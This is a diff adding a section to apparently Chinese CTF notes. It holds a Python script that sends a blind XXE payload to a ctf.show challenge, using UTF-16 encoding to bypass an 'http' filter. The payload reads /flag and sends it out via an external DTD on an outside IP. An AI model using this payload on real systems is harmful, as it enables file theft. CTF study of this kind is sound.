@@ -158,3 +158,26 @@ file_put_contents($txt,$xxe,FILE_APPEND)
 %send;
 ] >
 ```
+
+^
+
+
+### 4.无回显XXE文件读取，过滤了http字符：
+用python编码绕过
+```
+import requests
+
+# 过滤了http，还不回显，使用utf-16编码绕过
+url = 'http://5ca0be81-2f45-4f3f-8774-94d39b117ffc.challenge.ctf.show/'
+data = """<!DOCTYPE ANY [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+<!ENTITY % dtd SYSTEM "http://1.92.88.247/xxe/pd.dtd">
+%dtd;
+%send;
+] >"""
+
+requests.post(url ,data=data.encode('utf-16'))
+print("done!")
+```
+
+
